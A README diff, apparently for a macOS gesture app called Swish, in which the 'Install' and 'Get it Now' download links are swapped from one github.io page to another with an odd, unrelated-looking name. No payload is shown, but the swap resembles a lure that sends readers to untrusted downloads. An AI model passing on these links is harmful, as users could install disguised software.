@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/swish)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/swish)
 
 </div>
 
@@ -81,7 +81,7 @@ Swish's gesture-based approach addresses a genuinely repetitive daily task — w
 
 <p align="center">
 
-[![Get it Now Swish](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/swish)
+[![Get it Now Swish](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/swish)
 
 </p>
 
